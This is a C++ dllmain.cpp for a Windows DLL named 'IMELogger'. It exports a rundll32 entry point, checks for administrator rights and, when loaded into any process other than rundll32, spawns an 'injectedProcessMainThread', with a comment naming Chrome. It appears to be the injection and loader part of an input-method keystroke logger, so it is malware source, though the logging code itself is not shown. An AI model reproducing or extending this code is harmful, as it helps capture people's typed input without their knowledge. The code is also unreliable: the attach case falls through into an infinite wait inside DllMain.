// dllmain.cpp : 定義 DLL 應用程式的進入點。
#include "pch.h"
#include "util.h"
#include "logger.h"
#include "imeLoggerCore.h"

#include <psapi.h> 

extern "C" __declspec(dllexport) void CALLBACK IMELoggerEntry(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	wchar_t dllPath[MAX_PATH];
	// Initializeing 
	if (DEBUG) {
		DEBUGlogger(L"IMELoggerEntry initializing...\n");
	}

	if (!getDLLPath(dllPath)) {
		if (DEBUG)
			DEBUGlogger(L"ExplorerMain | Fail to get DLL path");
		ExitProcess(-1);
	}

	// Register key first
	if (isUserAdmin()) {
		MessageBoxW(NULL, L"IMELoggerEntry Start\n ", L"IMELoggerEntry", MB_OK);
	}
	else if (DEBUG) {
		MessageBoxW(NULL, L"Please run as administrator\nRun without admin now ", L"IMELoggerEntry", MB_OK);
		exit(-1);
	}

	if (!getDLLPath(dllPath)) {
		if (DEBUG)
			DEBUGlogger(L"ExplorerMain | Fail to get DLL path");
		exit(-1);
	}
	if (DEBUG) {
		DEBUGlogger(L"IMELoggerEntry initialized!\n");
	}
	// Initialized

	IMELoggerMain();


	ExitProcess(0);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

	HANDLE hThread = NULL;
	DWORD threadId = 0;
	HANDLE hProcess = nullptr;
	wchar_t processName[MAX_PATH] = L"<unknown>";
	wchar_t targetProcessName[] = L"rundll32.exe";
	wchar_t debugProcessName[] = L"WMIdorce.exe";

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		hProcess = GetCurrentProcess();
		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
		{
			if (_wcsicmp(processName, targetProcessName)!= 0) {
				MessageBoxW(NULL, L"OwO\n ", L"IMELoggerEntry", MB_OK);
				// New thread for chromeMain
				hThread = CreateThread(
					NULL,
					0,
					injectedProcessMainThread,
					NULL,
					0,
					&threadId
				);

				if (hThread == NULL) {
					// fail to create thread
				}
				
			}
			else {
			
			}
		}


    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
		
		Logger::getInstance().closeAll();

		if (hThread != NULL) {
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			hThread = NULL;
		}
		
        break;
    }
    return TRUE;
}

